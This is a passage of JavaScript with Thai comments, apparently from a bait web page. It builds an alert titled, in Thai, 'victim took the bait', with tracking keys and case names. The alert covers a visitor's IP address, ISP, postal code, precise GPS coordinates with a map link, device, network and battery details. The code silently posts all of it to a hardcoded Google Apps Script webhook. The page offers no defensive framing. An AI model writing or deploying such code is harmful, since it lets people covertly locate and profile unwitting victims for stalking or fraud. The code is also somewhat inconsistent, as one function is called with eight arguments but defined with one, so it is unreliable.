        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbx7iVmDBbzc-QtNs-xSuzAnqgzeeA1GUxcYTJl8PePhU81t063E5nmTlcIlXxu3C7c1/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
